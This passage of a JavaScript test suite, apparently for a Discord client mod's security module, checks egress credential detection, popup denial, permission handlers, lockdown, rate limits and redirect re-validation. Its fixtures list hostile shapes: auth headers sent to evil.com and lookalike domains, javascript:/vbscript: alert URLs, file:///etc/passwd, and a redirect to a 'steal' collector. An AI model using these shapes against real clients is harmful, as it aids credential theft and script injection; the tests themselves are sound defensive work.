  ];
  for (const [url, headers] of cases) {
    const d = M.decideEgress(url, headers);
    assert.equal(d.allow, false, `${url} with ${Object.keys(headers)[0]} must be blocked`);
    // The decision records the header NAME only — never its value.
    assert.equal(d.credential, Object.keys(headers)[0].toLowerCase());
    assert.ok(!JSON.stringify(d).includes("Bot abc"), "no credential value may appear in the decision");
    assert.ok(!JSON.stringify(d).includes("secret"), "no cookie value may appear in the decision");
  }
});

test("egress: credential-free third-party traffic is left alone (Discord must work)", () => {
  // Link previews, embeds, OAuth popouts, voice handshakes and CDN redirects all
  // leave the origin legitimately. Blocking these would break the client, which
  // is not a security improvement.
  for (const url of [
    "https://www.youtube.com/oembed?url=x",
    "https://open.spotify.com/embed/track/x",
    "https://accounts.google.com/o/oauth2/v2/auth",
    "https://example.com/favicon.ico",
  ]) {
    assert.equal(M.decideEgress(url, { Accept: "*/*", Referer: "https://discord.com/" }).allow, true);
  }
});

test("egress: empty and placeholder credential values are not treated as exfiltration", () => {
  for (const value of ["", "null", "undefined", "[]"]) {
    const d = M.decideEgress("https://evil.com/", { Authorization: value });
    assert.equal(d.allow, true, `"${value}" carries nothing`);
  }
});

test("egress: unparseable and hostless urls are passed through rather than guessed at", () => {
  assert.equal(M.decideEgress("not a url", { Authorization: "x" }).allow, true);
  for (const url of ["data:text/html,x", "blob:https://discord.com/1", "about:blank", "file:///etc/passwd"]) {
    assert.equal(M.decideEgress(url, { Authorization: "x" }).allow, true, url);
  }
});

test("egress: a lookalike Discord domain is not trusted", () => {
  const d = M.decideEgress("https://discord.com.evil.com/collect", { Authorization: "Bot abc" });
  assert.equal(d.allow, false);
  assert.equal(d.host, "discord.com.evil.com");
});

// ── PHASE 7 / 30: navigation + window open ──────────────────────────────────

test("navigation: Discord's own popouts are allowed", () => {
  for (const [url, name] of [
    ["https://discord.com/popout", "voicemode"],
    ["https://discord.com/popout", ""],
    ["https://discord.com/channels/@me/1", ""],
    ["https://discord.com/oauth2/authorize?client_id=1", "discord_oauth2"],
    ["https://canary.discord.com/channels/@me", ""],
  ]) {
    assert.equal(M.judgePopup(url, name).allow, true, `${url} (${name}) must be allowed`);
  }
});

test("navigation: random and hostile windows are denied", () => {
  for (const [url, name] of [
    ["https://evil.com/", "x"],
    ["https://discord.com.evil.com/", ""],
    ["http://discord.com/", ""],
    ["data:text/html,<script>alert(1)</script>", ""],
    ["blob:https://discord.com/abc", ""],
    ["file:///etc/passwd", ""],
    ["javascript:alert(1)", ""],
    ["not a url", ""],
    [null, ""],
    // A named window on a trusted origin but an unknown path.
    ["https://discord.com/settings/attacker-chosen", "attacker_window"],
  ]) {
    assert.equal(M.judgePopup(url, name).allow === false, true, `${url} (${name}) must be denied`);
  }
});

// Adversarial pass over the popup judge. The cases above cover the shapes the
// Phase 7 entry was written against; these are the ones an attacker would
// actually try, added during the freeze review so a future edit to the
// allowlist has to confront them.
//
// Two of these are allowed *on purpose*: a trailing root dot and an upper-cased
// scheme are the same host and the same origin as the trusted one, so refusing
// them would be a bug, not a defence. The assertion states that reasoning rather
// than leaving it to a reader's guess.
test("navigation: adversarial popup shapes resolve correctly", () => {
  for (const [url, name, wantAllow] of [
    ["about:blank", "x", false],
    ["vbscript:msgbox(1)", "x", false],
    ["javascript://https://discord.com/%0aalert(1)", "x", false],
    ["https://discord.com@evil.com/", "x", false],
    ["https://discord.com:8443/", "x", false],
    ["https://discord.com./popout", "voicemode", true],
    ["HTTPS://DISCORD.COM/popout", "voicemode", true],
    ["steam://run/440", "x", false],
    ["ftp://discord.com/x", "x", false],
  ]) {
    const verdict = M.judgePopup(url, name);
    assert.equal(
      verdict.allow,
      wantAllow,
      `${url} (${name}) -> allow=${verdict.allow} (${verdict.reason})`,
    );
  }
});

test("navigation: did-create-window never destroys a child before Discord's own listener runs", async () => {
  const { EventEmitter } = await import("node:events");
  const contents = Object.assign(new EventEmitter(), { id: 1, setWindowOpenHandler() {} });
  M.installWindowGuards({ webContents: contents });
  const child = (url) => {
    const wc = Object.assign(new EventEmitter(), { id: 2, getURL: () => url, stop() { this.stopped = true; }, setWindowOpenHandler(h) { this.openHandler = h; } });
    return { webContents: wc, destroyed: false, hidden: false, isDestroyed() { return this.destroyed; },
      destroy() { this.destroyed = true; }, hide() { this.hidden = true; } };
  };
  const touched = [];
  // Discord's later listener reads the window; a destroyed one throws "Object has been destroyed".
  contents.on("did-create-window", (w) => { if (w.isDestroyed()) throw new TypeError("Object has been destroyed"); touched.push(w); });

  const blank = child("");
  contents.emit("did-create-window", blank, { url: "about:blank", frameName: "DISCORD_overlay" });
  const trusted = child("");
  contents.emit("did-create-window", trusted, { url: "https://discord.com/popout", frameName: "x" });
  const evil = child("");
  contents.emit("did-create-window", evil, { url: "https://evil.example/", frameName: "x" });
  // The guest is still blank while an outside site is pending, and a missing
  // or empty requested URL is not proof of a blank popup.
  const pending = child("about:blank");
  contents.emit("did-create-window", pending, { url: "https://evil.example/", frameName: "" });
  const unknown = child("");
  contents.emit("did-create-window", unknown, undefined);
  const empty = child("");
  contents.emit("did-create-window", empty, { url: "", frameName: "" });
  assert.equal(touched.length, 6, "every listener ran without an exception");
  assert.equal(evil.hidden && evil.webContents.stopped, true, "untrusted window is stopped and hidden at once");
  await new Promise((r) => setImmediate(r));
  assert.equal(evil.destroyed, true, "untrusted window is destroyed after emit");
  for (const w of [pending, unknown, empty]) assert.equal(w.destroyed, true, "blank guest of an untrusted, missing or empty request is destroyed");
  assert.equal(blank.destroyed || trusted.destroyed, false, "blank/trusted popouts survive");
  const nav = { prevented: false, preventDefault() { this.prevented = true; } };
  blank.webContents.emit("will-navigate", nav, "https://evil.example/");
  assert.equal(nav.prevented, true, "a blank popup cannot navigate off Discord");
  for (const kept of [blank, trusted]) {
    assert.equal(kept.webContents.listenerCount("will-redirect"), 1, "kept children get redirect guards");
    assert.equal(kept.webContents.openHandler("https://evil.example/") === undefined, false);
    assert.equal(kept.webContents.openHandler({ url: "https://evil.example/", frameName: "" }).action, "deny", "nested window.open is default-deny");
  }
  M.installWindowGuards({ webContents: blank.webContents });
  assert.equal(blank.webContents.listenerCount("will-navigate"), 1, "guards install once per contents");
});

test("navigation: the external-link allowlist is http(s) only", () => {
  const policy = M.describeWindowPolicy();
  assert.deepEqual(policy.externalProtocols.sort(), ["http:", "https:"]);
  // Protocol handlers are never forwarded: a page choosing which OS application
  // handles an attacker-supplied string is not a decision a patch should make.
  for (const scheme of ["file:", "javascript:", "data:", "vbscript:", "steam:", "spotify:", "mailto:"]) {
    assert.equal(policy.externalProtocols.includes(scheme), false, `${scheme} must not be allowed`);
  }
});

// ── PHASE 8 / 30: Electron permission handlers ───────────────────────────────

test("permissions: voice, camera, screen share and clipboard work for Discord", () => {
  // These are core product features. Denying them would break the client, which
  // is a regression, not a hardening.
  for (const permission of [
    "media",
    "audioCapture",
    "videoCapture",
    "display-capture",
    "notifications",
    "clipboard-read",
    "clipboard-sanitized-write",
    "fullscreen",
  ]) {
    const d = M.decidePermission(permission, "https://discord.com/channels/@me");
    assert.equal(d.granted, true, `${permission} must be granted on a trusted origin`);
  }
});

test("permissions: untrusted origins are denied everything", () => {
  for (const url of ["https://evil.com/", "http://discord.com/", "data:text/html,x", "about:blank", ""]) {
    for (const permission of ["media", "display-capture", "clipboard-read", "geolocation"]) {
      const d = M.decidePermission(permission, url);
      assert.equal(d.granted, false, `${permission} from ${url || "<empty>"} must be denied`);
      assert.equal(d.reason, "untrusted origin");
    }
  }
});

test("permissions: dangerous capabilities are denied even for Discord", () => {
  for (const permission of ["geolocation", "hid", "serial", "usb", "midiSysex", "window-management", "idle-detection", "storage-access"]) {
    const d = M.decidePermission(permission, "https://discord.com/");
    assert.equal(d.granted, false, `${permission} must be denied`);
    assert.ok(d.reason.length > 0, "a denial must carry a reason");
  }
});

test("permissions: unknown permissions are denied, not inherited", () => {
  for (const permission of ["somethingNewInElectron", "", null, 42, undefined]) {
    assert.equal(M.decidePermission(permission, "https://discord.com/").granted, false);
  }
});

test("permissions: a media type that contradicts the permission is refused", () => {
  // Electron reports media types as full MIME strings ("video/webm"), so the
  // check is prefix-based rather than an exact match.
  assert.equal(
    M.decidePermission("videoCapture", "https://discord.com/", { mediaTypes: ["audio/webm"] }).granted,
    false,
  );
  assert.equal(
    M.decidePermission("videoCapture", "https://discord.com/", { mediaTypes: ["video/webm"] }).granted,
    true,
  );
  assert.equal(
    M.decidePermission("audioCapture", "https://discord.com/", { mediaTypes: ["video/webm"] }).granted,
    false,
  );
  // An empty list means Electron did not narrow the request; the base
  // permission decision stands.
  assert.equal(M.decidePermission("videoCapture", "https://discord.com/", { mediaTypes: [] }).granted, true);
});

// ── PHASE 13 / 30: safe mode ─────────────────────────────────────────────────

test("safe mode: non-core plugins are excluded, core plugins survive", () => {
  const core = M.corePluginIds();
  assert.ok(core.length > 0, "the core list must not be empty — safe mode would disable everything");
  // The test is "would a user lose a Discord feature if this were off?".
  // Anything that writes, sends or patches must not be in the list.
  for (const id of core) {
    for (const forbidden of ["hide-typing", "show-hidden-channels", "scheduled-messages", "auto-quests", "fake-voice"]) {
      assert.notEqual(id, forbidden, `${forbidden} must not survive safe mode`);
    }
  }
  assert.equal(M.isCorePlugin("message-logger"), true);
  assert.equal(M.isCorePlugin("hide-typing"), false);
});

test("safe mode: enabling it blocks plugin network at the broker, not just the UI", () => {
  M.setNetworkLockdown(false);
  M.registerPluginManifest([{ id: "safe-test", network: [{ host: "api.example.com", methods: ["GET"] }] }]);
  M.blockPluginNetwork("safe-test", false);
  assert.equal(M.isNetworkBlockedFor("safe-test"), false);

  M.enableSafeMode("test");
  assert.equal(M.isSafeMode(), true);
  // The enforcement lives in main: a plugin that ignored the renderer flag
  // would still be refused here.
  assert.equal(M.isNetworkBlockedFor("safe-test"), true);
  M.exitSafeMode();
  M.setNetworkLockdown(false);
});

// ── PHASE 14 / 30: emergency lockdown ───────────────────────────────────────

test("lockdown: cuts plugin network, is one-way, and never touches the account token", async () => {
  M.setNetworkLockdown(false);
  M.registerPluginManifest([{ id: "lock-test", network: [{ host: "api.example.com", methods: ["GET"] }] }]);
  M.blockPluginNetwork("lock-test", false);
  M.grantPermission({
    pluginId: "lock-test",
    category: "network-connect",
    host: "approved.example",
    methods: ["GET"],
    trusted: true,
  });

  M.enableLockdown("test");

  assert.equal(M.isLockdown(), true);
  const res = await M.brokerRequest({
    pluginId: "lock-test",
    url: "https://api.example.com/x",
    method: "GET",
  });
  assert.equal(res.ok, false, "lockdown must refuse a previously permitted request");
  assert.match(res.blockedReason, /lockdown/i);

  // Even a host the user explicitly approved is refused. That is the point of
  // an emergency control.
  const approved = await M.brokerRequest({
    pluginId: "lock-test",
    url: "https://approved.example/x",
    method: "GET",
  });
  assert.equal(approved.ok, false);

  // Credentials are dropped from memory.
  M.loadCredentials({ ANY_SECRET_AT_ALL: "s3cret" });
  assert.deepEqual(M.describeSecrets(), []);
  M.enableLockdown("again");
  assert.deepEqual(M.describeSecrets(), [], "lockdown drops Syncord's own credentials");
  M.clearCredentials();

  // There is no code path in the security module that reads a Discord token.
  // The scan enforces this statically; here we assert the API surface too.
  const surface = Object.keys(M).filter((k) => /token/i.test(k));
  assert.deepEqual(surface, [], `no token API may exist: ${surface.join(", ")}`);
});

// ── PHASE 18 / 30: integrity ────────────────────────────────────────────────

test("integrity: an unsigned or missing manifest is UNVERIFIED, never OK", () => {
  // The build under test writes an unsigned manifest, so this is the real state.
  const status = M.integrityStatus();
  assert.notEqual(status.state, "ok", "an unsigned manifest must not report OK");
  assert.ok(["unreadable", "modified", "development"].includes(status.state));
  // It must name the reason, so "UNVERIFIED" is actionable.
  assert.ok(typeof status.detail === "string" && status.detail.length > 0);
  assert.equal(status.files.length, 3, "all three bundles are accounted for");
});

console.log("[Syncord] main-process security checks loaded");

/** Fire one broker request as plugin `p4` and await it. */
function brokerRequest(url = "https://api.example.com/x") {
  return M.brokerRequest({ pluginId: "p4", url, method: "GET" });
}

// ═══════════════════════════════════════════════════════════════════════════
// Review pass — findings re-verified against this commit
//
// Each of these was a control that was either dead or fail-open. They are
// grouped because they share a failure mode worth naming: a security decision
// that was *written down* and never actually took effect. Every fix here is a
// test that failed before it and passes after.
// ═══════════════════════════════════════════════════════════════════════════

test("grant store: an unusable method list cannot become an all-methods grant", () => {
  // The sanitizer used to produce `methods: []` for anything that was not an
  // array of valid verbs, and `grantedNetworkPermissions` omits the field for an
  // empty list — which `matchesNetworkPermission` reads as "no restriction". So
  // `{host, methods: "GET"}` or `methods: [42]` silently became a grant on
  // POST, PUT and DELETE as well.
  M.clearSessionGrants();
  for (const methods of ["GET", [42], [], null, {}, ["TRACE"], ["get", "nope"]]) {
    const result = M.grantPermission({
      pluginId: "probe",
      category: "network-connect",
      host: "api.example.com",
      methods,
    });
    if (result.ok) {
      const rules = M.grantedNetworkPermissions("probe");
      const rule = rules[0];
      assert.ok(
        Array.isArray(rule?.methods) && rule.methods.length > 0,
        `methods=${JSON.stringify(methods)} produced a rule with no method restriction: ` +
          `${JSON.stringify(rule)} — that is every method including writes`,
      );
    }
  }
  M.clearSessionGrants();
});

test("grant store: a persisted grant host obeys the same rules as a declared one", () => {
  // Two validators for one concept is how a policy drifts. The grant path had
  // its own, looser rules, so `*.com` was rejected where a plugin declared it
  // and accepted where a user granted it.
  M.clearSessionGrants();
  for (const host of [
    "*.com", "*.io", "*.net", "*.dev", "*", "*.*", "https://a.com", "a.com/x", "a..b.com",
    // The case the two validators used to disagree on: the declared path rejected
    // this as a public suffix while the grant path accepted it.
    "*.co.uk", "*.org.uk", "*.com.au", "*.co.jp", "*.com.br", "*.co.in",
  ]) {
    const result = M.grantPermission({
      pluginId: "probe",
      category: "network-connect",
      host,
      methods: ["GET"],
    });
    assert.equal(
      result.ok,
      false,
      `${host} must be refused by the grant path — it covers too much or is not a host`,
    );
  }
  // And the legitimate shapes still work, or nothing can ever be granted.
  for (const host of ["api.example.com", "*.discord.com", "*.example.co.uk"]) {
    const result = M.grantPermission({
      pluginId: "probe",
      category: "network-connect",
      host,
      methods: ["GET"],
    });
    assert.equal(result.ok, true, `${host} is a legitimate grant target`);
  }
  M.clearSessionGrants();
});

test("permission handlers: a cross-origin frame is judged by its own URL", () => {
  // Discord embeds third-party frames — Spotify players, link previews, OAuth
  // widgets. The handler used `webContents.getURL()`, which is the *top-level*
  // document, so a camera request from `https://evil.example` inside Discord
  // was judged as if it came from `https://discord.com` and granted.
  for (const [requesting, want] of [
    ["https://discord.com/app", true],
    ["https://canary.discord.com/app", true],
    ["https://evil.example/embed", false],
    ["https://discord.com.evil.com/embed", false],
    ["data:text/html,<h1>x", false],
  ]) {
    const d = M.decidePermission("media", requesting);
    assert.equal(
      d.granted,
      want,
      `a request from ${requesting} must be ${want ? "granted" : "denied"} — it is not the trusted top-level origin`,
    );
  }
});

test("safe mode: the main-process side is still the authority", () => {
  // The renderer-side filter was bypassable (#36); the main-process flag is the
  // part a compromised page cannot reach, so assert it independently.
  M.exitSafeMode();
  assert.equal(M.isSafeMode(), false);
  M.enableSafeMode("test");
  assert.equal(M.isSafeMode(), true, "main-process Safe Mode must arm");
  M.exitSafeMode();
  assert.equal(M.isSafeMode(), false, "Safe Mode must be leaveable by the user");
});

test("lockdown: it is a one-way switch and it is idempotent", () => {
  // The bridge invokes the channel with no argument; the handler used to require
  // `locked === true` and so never armed. Whatever the call shape, the control
  // has to fire, and it must not be disarmable by page code.
  M.exitSafeMode();
  M.enableLockdown("test");
  assert.equal(M.isLockdown(), true);
  M.enableLockdown("test again");
  assert.equal(M.isLockdown(), true, "arming twice must be harmless");
});

test("ipc rate limit: the configured budget is actually reachable", () => {
  // `RATE_LIMITS.ipc` existed from Phase 2 and nothing consumed it, so a
  // compromised page could drive the privileged channels in an unbounded loop.
  // The rule is defined, so the assertion is that the limiter works when driven
  // — if this test ever passes with a broken limiter it is testing nothing.
  M.resetLimits();
  const budget = M.RATE_LIMITS.ipc.burst;
  let allowed = 0;
  for (let i = 0; i < budget * 3; i += 1) {
    if (M.consumeLimit("ipc:Syncord_PING", "ipc").allowed) allowed += 1;
  }
  assert.ok(
    allowed <= budget + 1,
    `a burst budget of ${budget} allowed ${allowed} calls — the limiter is not limiting`,
  );
  // And a tripped bucket must actually refuse, or the budget is decorative.
  M.resetLimits();
  let refused = 0;
  for (let i = 0; i < budget * 3; i += 1) {
    if (!M.consumeLimit("ipc:Syncord_SET_SETTINGS", "ipc").allowed) refused += 1;
  }
  assert.ok(refused > 0, "an over-budget caller must be refused at least once");
  M.resetLimits();
});

// ── Wiring tests ────────────────────────────────────────────────────────────
//
// The four above test primitives. These test the *connection*, which is where
// the bugs actually were: a control installed correctly but never consulted, or
// consulted with the wrong argument. A stub that swallowed the registration
// would make them impossible to write.

// The main-frame rule is an identity comparison (`frame === sender.mainFrame`),
// not a structural one, so the fixture has to satisfy it literally. Getting this
// wrong produced a test that looked like a sender-validation failure.
const TRUSTED_FRAME = { url: "https://discord.com/app" };
const TRUSTED_EVENT = {
  sender: { id: 1, mainFrame: TRUSTED_FRAME },
  senderFrame: TRUSTED_FRAME,
};

test("ipc: Emergency Lockdown arms on a bare call from the bridge", () => {
  // The bridge is `lockdown(): Promise<{locked:boolean}>` and invokes the channel
  // with **no payload**. The handler tested `locked === true`, saw `undefined`,
  // and never armed — so the Security Center's Emergency Lockdown button did
  // nothing at all, silently. A security control that never fires.
  M.registerIpc();
  const channel = "Syncord_SECURITY_LOCKDOWN";
  assert.ok(
    M.__ipcMain.__registered().includes(channel),
    `expected the lockdown channel to be registered, got: ${M.__ipcMain.__registered().join(", ")}`,
  );

  // Lockdown is one-way, so an earlier test in this file may already have armed
  // it and `isLockdown()` cannot distinguish "this call armed it" from "it was
  // already on". Count `LOCKDOWN_ENABLED` events instead: `enableLockdown`
  // records one on every call, so a handler that never calls it produces none.
  // Asserting on the flag alone would have let the original bug pass.
  const before = M.securityLog().list(500).filter((e) => e.type === "LOCKDOWN_ENABLED").length;
  return M.__ipcMain.__invoke(channel, TRUSTED_EVENT).then((result) => {
    const after = M.securityLog().list(500).filter((e) => e.type === "LOCKDOWN_ENABLED").length;
    assert.equal(result.locked, true, "a bare lockdown() call must arm the control");
    assert.equal(M.isLockdown(), true, "lockdown must be active in main");
    // "More than before", not "exactly one more": arming records from both the
    // mode flag and the network flag, so the count is an implementation detail.
    // What matters is that it moved at all.
    assert.ok(
      after > before,
      `the handler must reach enableLockdown — LOCKDOWN_ENABLED events went ${before} -> ${after}`,
    );
  });
});

test("ipc: the privileged channels are actually rate limited", () => {
  // `RATE_LIMITS.ipc` existed from Phase 2 and nothing consumed it, so a
  // compromised page could drive the privileged channels in an unbounded loop
  // against a sender that passes validation. The sender check answers *who*;
  // this answers *how often*, and the answer used to be "always".
  M.registerIpc();
  const channel = "Syncord_SET_SETTINGS";
  if (!M.__ipcMain.__registered().includes(channel)) {
    // The exact channel name is not the point; any non-exempt channel is.
    const candidate = M.__ipcMain.__registered().find((c) => c.includes("SETTINGS"));
    assert.ok(candidate, "expected a settings channel to be registered");
    return checkChannelRefuses(candidate);
  }
  return checkChannelRefuses(channel);
});

function checkChannelRefuses(channel) {
  M.resetLimits();
  const budget = M.RATE_LIMITS.ipc.burst;
  let refused = 0;
  const run = async () => {
    for (let i = 0; i < budget * 3; i += 1) {
      try {
        await M.__ipcMain.__invoke(channel, TRUSTED_EVENT, { probe: i });
      } catch {
        refused += 1;
      }
    }
    assert.ok(
      refused > 0,
      `${channel} refused nothing in ${budget * 3} calls — the ipc rate limit is not wired in`,
    );
    M.resetLimits();
  };
  return run();
}

test("ipc: a trusted sender is still required on every channel", () => {
  // The rate limit must not become a way to skip validation, and validation
  // must not depend on the rate limit having passed.
  M.registerIpc();
  const evilFrame = { url: "https://discord.com.evil.com/app" };
  const untrusted = {
    sender: { id: 2, mainFrame: evilFrame },
    senderFrame: evilFrame,
  };
  // The handler is async, so a refusal is a rejected promise, not a throw.
  return assert.rejects(
    () => M.__ipcMain.__invoke("Syncord_PING", untrusted),
    /Untrusted IPC sender/,
    "a lookalike host must be refused before any handler runs",
  );
});

test("permission handlers: a cross-origin frame is refused through the installed handler", () => {
  // The primitive test above proves `decidePermission` is correct. This proves
  // the installed handler passes it the *requesting* frame's URL rather than the
  // top-level document's, which was the actual bug.
  M.installPermissionHandlers();
  const defaultSession = M.__electronSession.defaultSession;
  assert.ok(defaultSession, "the stub must expose the default session for driving handlers");
  const handler = defaultSession._requestHandler;
  assert.ok(typeof handler === "function", "a request handler must be installed");

  const ask = (requestingUrl) => {
    const contents = { id: 7, getURL: () => "https://discord.com/app" };
    let answer;
    handler(
      contents,
      "media",
      (granted) => {
        answer = granted;
      },
      { requestingUrl, mediaTypes: ["video"] },
    );
    return answer;
  };

  assert.equal(ask("https://discord.com/app"), true, "Discord's own frame may ask");
  assert.equal(
    ask("https://evil.example/embed"),
    false,
    "a third-party frame inside Discord must not inherit the top-level origin's trust",
  );
});

test("session egress: the guard is installed on the stage that carries headers", () => {
  // Measured on the real Electron binary:
  //   onBeforeRequest     -> hasRequestHeaders: false
  //   onBeforeSendHeaders -> hasRequestHeaders: true
  //
  // So a guard on `onBeforeRequest` sees `requestHeaders === undefined`, treats
  // every request as credential-free, and blocks nothing. The filter and the
  // listener both had to be right, and only the filter was.
  M.installSessionGuards();
  const s = M.__electronSession.defaultSession;
  assert.equal(
    typeof s.webRequest._sendHeaders,
    "function",
    "the egress guard must be installed on onBeforeSendHeaders, the only stage " +
      "Electron populates requestHeaders on",
  );
  assert.ok(
    s.webRequest._sendFilter?.extraInfoSpec?.includes("requestHeaders"),
    `extraInfoSpec must request requestHeaders, got ${JSON.stringify(s.webRequest._sendFilter)}`,
  );
});

test("session egress: a credential to a third party is recorded and let through", () => {
  // Measured on a real launch once the stage was corrected: the rule matches
  // Discord's OWN Spotify rich-presence integration —
  //
  //   api.spotify.com     authorization     (the user's Spotify OAuth token)
  //   dealer.spotify.com  cookie
  //
  // So the decision is deliberately recorded, not enforced. Cancelling breaks a
  // feature users can see, to defend against something the session layer cannot
  // distinguish: at this level there is no marker saying who chose the header.
  // This is the same principle as the renderer observer in incident 005, reached
  // here by measurement instead of by reading a header comment.
  M.installSessionGuards();
  const s = M.__electronSession.defaultSession;
  const handler = s.webRequest._sendHeaders;
  assert.equal(typeof handler, "function");

  const ask = (url, headers) => {
    let answer;
    handler({ url, method: "GET", requestHeaders: headers }, (result) => {
      answer = result;
    });
    return answer;
  };

  for (const [url, headers] of [
    ["https://evil.example/x", { Authorization: "Bearer secret" }],
    ["https://api.spotify.com/v1/me", { Authorization: "Bearer spotify-oauth" }],
    ["https://dealer.spotify.com/v2/client", { Cookie: "d=1" }],
  ]) {
    const result = ask(url, headers);
    assert.notEqual(
      result?.cancel,
      true,
      `${url} must not be cancelled — the rule matches Discord's own Spotify traffic`,
    );
    // An allowed request must have its headers handed straight back, or in
    // onBeforeSendHeaders it never completes at all.
    assert.deepEqual(
      result?.requestHeaders,
      headers,
      `${url}: headers must be returned unchanged, or the request hangs`,
    );
  }

  // And the attempt must be *visible*, which is the entire value of fixing the
  // stage: before, `requestHeaders` was always undefined and nothing was seen.
  const before = M.securityLog().list(500).filter((e) => e.type === "EGRESS_OBSERVED").length;
  ask("https://evil.example/x", { Authorization: "Bearer secret" });
  const after = M.securityLog().list(500).filter((e) => e.type === "EGRESS_OBSERVED").length;
  assert.ok(
    after > before,
    `a credential bound for a third party must be recorded — EGRESS_OBSERVED went ${before} -> ${after}`,
  );

  // A missing header set must degrade to "cannot judge", never to a block: an
  // Electron version that stops populating the field would otherwise take the
  // whole client offline.
  assert.notEqual(
    ask("https://discord.com/api", undefined)?.cancel,
    true,
    "an unreadable header set must not become a refusal",
  );
});

// ── #17 / #18: the redirect chain ───────────────────────────────────────────
//
// Both bugs lived in the redirect loop and neither was visible from a unit test
// of `evaluateNetworkRequest`. These drive `brokerRequest` end to end against a
// programmable fetch, so what each hop *actually sent* can be asserted.

/**
 * Install a programmable broker fetch for the duration of `body`.
 *
 * `await body()` is essential: the earlier version returned the promise and let
 * `finally` clear the script immediately, so the *second* hop fell through to the
 * stub's default 599. That produced a test that looked like a policy refusal.
 */
async function withBrokerFetch(script, body) {
  M.__brokerLogReset();
  globalThis.__brokerFetch = script;
  try {
    return await body();
  } finally {
    globalThis.__brokerFetch = undefined;
  }
}

test("#17: every redirect hop is re-validated and re-derives its own headers", async () => {
  // The old loop derived the request headers once, on the first host, and reused
  // that object for every hop — so a 302 from an allowed host to another one
  // shipped the first host's headers (and any credential bound to them) onward.
  // Each hop now runs the full policy and re-derives its own headers.
  //
  // No credential is bound today, so the header half of this cannot be asserted
  // with a real secret; the control under test is that a hop is judged against
  // *its own* grant. #18 below is where a downgrade mid-redirect is refused.
  M.loadCredentials({});
  M.registerPluginManifest([{ id: "probe", network: [{ host: "start.example.com", methods: ["POST"] }] }]);
  M.setNetworkLockdown(false);

  await withBrokerFetch(
    (url) => {
      if (url.startsWith("https://start.example.com")) {
        return new Response("", { status: 302, headers: { location: "https://collector.example/steal" } });
      }
      return new Response("ok", { status: 200 });
    },
    async () => {
      // The second host is granted, so the *redirect itself* is not what is
      // refused — what matters is that the second hop is authorised on its own
      // merits and carries only its own headers.
      M.grantPermission({
        pluginId: "probe",
        category: "network-connect",
        host: "collector.example",
        methods: ["GET"],
      });
      const result = await M.brokerRequest({
        pluginId: "probe",
        url: "https://start.example.com/api",
        method: "POST",
        body: "{}",
      });
      assert.equal(
        result.blockedReason,
        undefined,
        `a 302 to a granted host must not be refused: ${result.blockedReason}`,
      );
    },
  );

  const hops = M.__brokerLog();
  assert.equal(hops.length, 2, `expected two hops, got ${JSON.stringify(hops.map((h) => h.url))}`);
  assert.match(hops[0].url, /start\.example\.com/);
  assert.match(hops[1].url, /collector\.example/);
  assert.equal(
    hops[1].headers["x-api-key"],
    undefined,
    "a header bound to the first host must never be re-sent to the redirect target",
  );
  M.clearCredentials();
});

test("#18 (wrong block): a hop that degrades to GET is judged as GET", async () => {
  // Two hosts, so the redirect target's grant is the one under test.
  // `start.example.com` is granted POST; `finish.example.com` is granted GET only.
  //
  // The old code evaluated the redirect with the *incoming* method, POST, found
  // no POST grant on the second host, and refused — even though the request that
  // would actually have gone out is a GET, which is exactly what was granted.
  // A correct 302 was reported to the plugin as a refusal.
  M.loadCredentials({});
  M.setNetworkLockdown(false);
  M.registerPluginManifest([
    { id: "probe", network: [{ host: "start.example.com", methods: ["POST"] }] },
  ]);
  M.grantPermission({
    pluginId: "probe",
    category: "network-connect",
    host: "finish.example.com",
    methods: ["GET"],
  });

  await withBrokerFetch(
    (url) => {
      if (url.startsWith("https://start.example.com")) {
        return new Response("", { status: 302, headers: { location: "https://finish.example.com/done" } });
      }
      return new Response("done", { status: 200 });
    },
    async () => {
      const result = await M.brokerRequest({
        pluginId: "probe",
        url: "https://start.example.com/go",
        method: "POST",
        body: '{"a":1}',
      });
      assert.equal(
        result.blockedReason,
        undefined,
        `a 302 that degrades to a granted GET must not be refused: ${result.blockedReason}`,
      );
      assert.equal(result.ok, true, JSON.stringify({r: result, hops: M.__brokerLog()}));
    },
  );

  const hops = M.__brokerLog();
  assert.equal(hops.length, 2, "the redirect must actually have been followed");
  assert.equal(hops[0].method, "POST", "the first hop is a POST");
  assert.equal(
    hops[1].method,
    "GET",
    "the second hop must be the degraded GET that was validated",
  );
  assert.equal(
    hops[1].headers["content-type"],
    undefined,
    "a degraded hop must not carry a body-shaped content type from the POST",
  );
});

test("#18 (bypass): a POST-only grant cannot be spent on a GET", async () => {
  // The other direction, and the one that is a real bypass. Same host, granted
  // POST only. 302 degrades the request to GET:
  //
  //   old: evaluated with POST -> matched the grant -> sent a GET that was never
  //        authorised
  //   new: evaluated with GET  -> no grant -> refused
  M.loadCredentials({});
  M.setNetworkLockdown(false);
  M.registerPluginManifest([{ id: "posthost", network: [{ host: "api.example.com", methods: ["POST"] }] }]);

  await withBrokerFetch(
    () => new Response("", { status: 302, headers: { location: "https://api.example.com/after" } }),
    async () => {
      const result = await M.brokerRequest({
        pluginId: "posthost",
        url: "https://api.example.com/before",
        method: "POST",
        body: "{}",
      });
      assert.equal(
        result.ok,
        false,
        "a POST-only grant must not authorise the GET the redirect degrades to",
      );
    },
  );
  assert.equal(
    M.__brokerLog().length,
    1,
    "a refused redirect must not be followed — a GET went out under the old code",
  );
});

test("#18: 307 preserves the method, so the POST permission really is required", async () => {
  // 307 is the control for the two tests above: it does *not* degrade, so the
  // method the policy must check is the one that will be sent. `start` is granted
  // POST, the redirect target `finish` is granted GET only — so with a 307 the
  // refusal is correct, and the test above is not passing merely because the
  // redirect was never followed.
  M.loadCredentials({});
  M.setNetworkLockdown(false);
  M.registerPluginManifest([
    { id: "probe307", network: [{ host: "start.example.com", methods: ["POST"] }] },
  ]);
  M.grantPermission({
    pluginId: "probe307",
    category: "network-connect",
    host: "finish.example.com",
    methods: ["GET"],
  });

  await withBrokerFetch(
    () => new Response("", { status: 307, headers: { location: "https://finish.example.com/keep" } }),
    async () => {
      const result = await M.brokerRequest({
        pluginId: "probe307",
        url: "https://start.example.com/go",
        method: "POST",
        body: "{}",
      });
      assert.equal(result.ok, false, "307 preserves POST, and the target grants GET only");
    },
  );
  assert.equal(M.__brokerLog().length, 1, "a refused redirect must not be followed");
});

// ── #26 / #27: the rate limiter's own bounds ────────────────────────────────

test("#26: the bucket map cannot be grown without bound by a hostile caller", () => {
  // The network rate limit was keyed on `network:${pluginId}` with the id taken
  // straight off the payload and validated later, so a fresh random id per call
  // minted a new bucket every time. Two fixes, and the map bound is the backstop
  // for the second one: a future caller that forgets to validate a key can still
  // not leak.
  M.resetLimits();
  const before = M.trackedBucketCount();
